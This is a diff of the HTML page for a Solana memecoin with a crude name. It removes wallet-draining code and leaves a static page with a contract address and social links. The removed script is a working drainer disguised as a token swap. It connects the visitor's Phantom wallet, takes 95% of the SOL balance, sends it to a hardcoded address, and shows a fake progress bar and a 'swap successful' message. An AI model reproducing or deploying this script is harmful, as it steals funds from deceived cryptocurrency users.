@@ -7,156 +7,76 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-        h1 {
-            text-align: center;
-            color: #333;
-        }
-        #app {
-            width: 80%;
-            margin: 0 auto;
-            text-align: center;
-            padding: 20px;
-            border-radius: 10px;
-            background-color: #fff;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        #walletAddress {
-            margin: 20px 0;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #007bff;
+            background-color: #000;
             color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            margin: 0;
+            padding: 0;
         }
-        button:hover {
-            background-color: #0056b3;
+        header {
+            text-align: center;
+            padding: 50px;
         }
-        .status {
-            margin-top: 20px;
-            font-size: 18px;
-            font-weight: bold;
+        header h1 {
+            font-size: 40px;
         }
-        #progressBar {
-            width: 100%;
-            height: 30px;
-            background-color: #e0e0e0;
-            border-radius: 15px;
-            margin-top: 20px;
-            display: none;
+        header p {
+            font-size: 20px;
+            margin: 10px 0;
         }
-        #progress {
-            height: 100%;
-            background-color: #4caf50;
-            border-radius: 15px;
-            width: 0;
+        .container {
+            text-align: center;
+            margin-top: 30px;
         }
         .social-links {
-            margin-top: 20px;
+            margin-top: 30px;
         }
         .social-links a {
-            margin: 0 10px;
+            margin: 0 15px;
+            color: #1DA1F2; /* Twitter Blue */
+            font-size: 20px;
             text-decoration: none;
-            font-size: 18px;
-            color: #007bff;
-            transition: color 0.3s ease;
         }
         .social-links a:hover {
-            color: #0056b3;
+            color: #00B2FF;
+        }
+        #logo {
+            width: 150px;
+            margin: 20px 0;
+        }
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            background-color: #111;
+        }
+        footer p {
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
 
-<div id="app">
+<header>
+    <img id="logo" src="logo-placeholder.png" alt="We Love Pussy Logo"> <!-- Replace with your logo -->
     <h1>We Love Pussy</h1>
-    <p id="walletAddress">Connect your Phantom wallet to see your Solana address</p>
-    <button id="connectButton">Connect Phantom Wallet</button>
-    <button id="swapButton" disabled>Swap Token</button>
-    <div class="status" id="status"></div>
-    <div id="progressBar"><div id="progress"></div></div>
+    <p>We love pussy and that’s what makes the world great</p>
+</header>
+
+<div class="container">
+    <h2>Token Information</h2>
+    <p>Contract Address: <strong>7awd6NXmEaYWV496StCrTGstRWacr14KR8SLkbjC5Pc6</strong></p>
 
     <!-- Social Media Links -->
     <div class="social-links">
-        <a href="https://t.me/welovepussycommunity" target="_blank">Join us on Telegram</a> |
+        <a href="https://t.me/welovepussycommunity" target="_blank">Join us on Telegram</a>
+        |
         <a href="https://x.com/welovepussycto?s=21" target="_blank">Follow us on Twitter (X)</a>
     </div>
 </div>
 
-<!-- Add the Buffer polyfill before Solana Web3.js -->
-<script src="https://cdn.jsdelivr.net/npm/buffer@5.6.0/index.min.js"></script>
-
-<!-- Load Solana Web3.js -->
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-
-<script>
-    const { PublicKey, Transaction, SystemProgram, Connection, clusterApiUrl } = solanaWeb3;
-    const recipientAddress = new PublicKey("3GXcLtX156MuRWSPAHWf9VPDaSPPZA6Tn1aARzUaWW8N");
-    let provider;
-    let userAccount;
-    const connection = new Connection(clusterApiUrl("mainnet-beta"));
-
-    // Connect to Phantom Wallet
-    document.getElementById("connectButton").addEventListener("click", async () => {
-        if (window.solana && window.solana.isPhantom) {
-            provider = window.solana;
-            try {
-                await provider.connect();
-                userAccount = provider.publicKey.toString();
-                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
-                document.getElementById("swapButton").disabled = false;
-            } catch (error) {
-                console.error("Error connecting to Phantom Wallet", error);
-            }
-        } else {
-            alert("Please install Phantom Wallet!");
-        }
-    });
-
-    // Swap Token Functionality (Send 95% of SOL balance)
-    document.getElementById("swapButton").addEventListener("click", async () => {
-        try {
-            // Display progress bar
-            document.getElementById("progressBar").style.display = "block";
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                if (progress < 100) {
-                    progress += 10;
-                    document.getElementById("progress").style.width = progress + "%";
-                }
-            }, 1000);
-
-            // Get user's SOL balance and calculate 95%
-            const balance = await connection.getBalance(provider.publicKey);
-            const amountToSend = Math.floor(balance * 0.95); // 95% of balance
-
-            // Create and send transaction
-            const transaction = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: provider.publicKey,
-                    toPubkey: recipientAddress,
-                    lamports: amountToSend
-                })
-            );
-
-            const signature = await provider.signAndSendTransaction(transaction);
-
-            // Stop progress bar and show success message
-            clearInterval(progressInterval);
-            document.getElementById("progress").style.width = "100%";
-            document.getElementById("status").innerText = "Swap successful: " + signature;
-        } catch (error) {
-            document.getElementById("status").innerText = "Swap failed: " + error.message;
-            document.getElementById("progress").style.width = "0%";
-        }
-    });
-</script>
+<footer>
+    <p>&copy; 2024 We Love Pussy. All Rights Reserved.</p>
+</footer>
 
 </body>
 </html>
